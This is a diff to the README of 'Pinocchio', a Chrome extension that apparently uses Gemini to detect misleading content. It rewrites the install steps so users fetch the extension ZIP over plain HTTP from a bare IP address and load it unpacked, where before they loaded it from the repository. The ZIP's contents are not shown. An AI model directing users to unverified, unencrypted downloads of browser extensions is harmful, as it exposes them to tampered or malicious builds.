@@ -31,11 +31,12 @@ Pinocchio is a powerful browser extension that helps users navigate the complex 
 
 ### Chrome Extension
 
-1. Download the extension folder or clone this repository
-2. Open Chrome and navigate to `chrome://extensions/`
-3. Enable "Developer Mode" in the top-right corner
-4. Click "Load unpacked" and select the `extension` directory from this project
-5. The Pinocchio icon should now appear in your browser toolbar
+1. Download the extension ZIP file from our [website](http://172.105.18.148:8080/static/files/extension.zip)
+2. Unzip/extract the downloaded file to a location on your computer
+3. Open Chrome and navigate to `chrome://extensions/`
+4. Enable "Developer Mode" in the top-right corner
+5. Click "Load unpacked" and select the extracted extension folder
+6. The Pinocchio icon should now appear in your browser toolbar
 
 ### Server Setup
 
@@ -154,4 +155,4 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 
 - Inspired by the classic tale of Pinocchio, whose nose grows when he tells lies
 - Powered by Google's Gemini AI for content analysis
-- Built with Flask, SQLite, and Chrome Extension APIs
+- Built with Flask, SQLite, Gemini, and Chrome Extension APIs
